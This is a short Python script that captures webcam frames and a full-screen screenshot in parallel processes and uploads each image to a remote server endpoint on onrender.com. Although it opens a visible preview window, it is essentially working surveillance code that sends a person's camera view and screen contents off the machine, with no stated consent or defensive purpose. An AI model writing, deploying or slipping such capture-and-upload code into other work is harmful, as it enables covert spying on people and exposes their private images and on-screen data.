import cv2
import time
from PIL import ImageGrab
from multiprocessing import Process
import requests
import numpy

def camera():

    cam = cv2.VideoCapture(0)
    
    if not cam.isOpened():
      raise RuntimeError("Cannot open camera")
    else:
       for x in range(2):
         ret, shot = cam.read()
         _, img_encoded = cv2.imencode('.png', shot)
         if not ret:
          raise RuntimeError("Cannot take photo")
         try:
          files = {'file': ('frame.png', img_encoded.tobytes(), 'image/png')}
          response = requests.post("https://mini-server-90un.onrender.com/send", files=files)
         except requests.exceptions.RequestException as e:
           print('Error sending shot', e)
         print(response.text)
         cv2.imshow("Recording (press ESC to stop)", shot)
         key = cv2.waitKey(1) 
         if key == 27:
           break
         time.sleep(5)
       cam.release()
       cv2.destroyAllWindows()

def screen_grabber():
   for x in range(1):
      screen = ImageGrab.grab()
      screen_np = numpy.array(screen)
      screen_np = cv2.cvtColor(screen_np, cv2.COLOR_RGB2BGR)
      _, img_encoded = cv2.imencode('.png', screen_np)
      files = {'file': ('frame.png', img_encoded.tobytes(), 'image/png')}
      try:
        response = requests.post("https://mini-server-90un.onrender.com/send", files=files)
        print(response.text)
      except requests.exceptions.RequestException as e:
        print("Error sending screenshot", e)
      time.sleep(5)
      
def main():
  p1 = Process(target=camera, args=()) 
  p2 = Process(target=screen_grabber, args=())  

  p1.start()
  p2.start()
  
  p1.join()
  p2.join()
  
if __name__ == "__main__":
    main()